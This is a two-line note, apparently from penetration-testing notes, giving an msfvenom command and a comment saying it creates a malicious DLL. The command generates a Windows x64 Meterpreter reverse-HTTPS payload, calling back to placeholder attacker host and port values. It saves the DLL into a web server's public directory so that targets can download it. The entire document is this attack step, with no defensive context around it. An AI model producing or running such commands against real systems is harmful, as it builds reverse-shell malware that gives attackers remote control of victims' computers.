sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST= <LHOST> LPORT=<LPORT> -f dll -o /var/www/html/met.dll

#IN SUMMARY; this line uses msfvenom to creates a malicious DLL. 